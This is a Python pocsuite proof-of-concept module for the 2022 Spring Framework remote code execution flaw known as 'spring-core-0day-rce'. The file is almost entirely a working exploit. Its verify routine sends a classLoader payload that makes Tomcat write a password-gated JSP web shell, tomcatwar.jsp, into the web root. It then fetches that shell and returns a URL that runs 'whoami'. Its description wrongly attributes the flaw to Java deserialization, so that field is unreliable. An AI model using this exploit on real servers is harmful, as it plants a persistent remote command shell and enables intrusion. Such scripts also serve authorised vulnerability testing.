#!/usr/bin/env python3
# coding: utf-8
import requests
from urllib.parse import urljoin
from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase

class TestPOC(POCBase):
    vulID = '1'  # ssvid
    version = '1.0'
    author = ['houdinis']
    vulDate = '2022-03-29'
    createDate = '2022-03-30'
    updateDate = '2022-03-30'
    references = ['http://www.seebug.org/vuldb/ssvid-']
    name = 'spring-core-0day-rce'
    appPowerLink = 'https://spring.io/'
    appName = 'spring'
    appVersion = '1.Spring Framework或Spring衍生框架2.JDK>=9'
    vulType = 'Rmote Code Execution'
    desc = '''
        Since SerializationUtils#deserialize is based on Java's serialization
        mechanism, it can be the source of Remote Code Execution (RCE)
        vulnerabilities.
    '''
    samples = ['']
    install_requires = ['']

    def _attack(self):
        result = {}
        #Write your code here

        return self.parse_output(result)

    def _verify(self):
        result = {}
        headers = {"suffix": "%>//",
                   "c1": "Runtime",
                   "c2": "<%",
                   "DNT": "1",
                   "Content-Type": "application/x-www-form-urlencoded"

                   }
        data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
        try:
            req = requests.post(self.url, headers=headers, data=data, timeout=15, allow_redirects=False, verify=False)
            shellurl = urljoin(self.url, 'tomcatwar.jsp')
            shellgo = requests.get(shellurl, timeout=15, allow_redirects=False, verify=False)
            if shellgo.status_code == 200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['Postdata'] = f"漏洞url:{shellurl}?pwd=j&cmd=whoami"
                return self.parse_output(result)
        except Exception as e:
            print(e)


    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)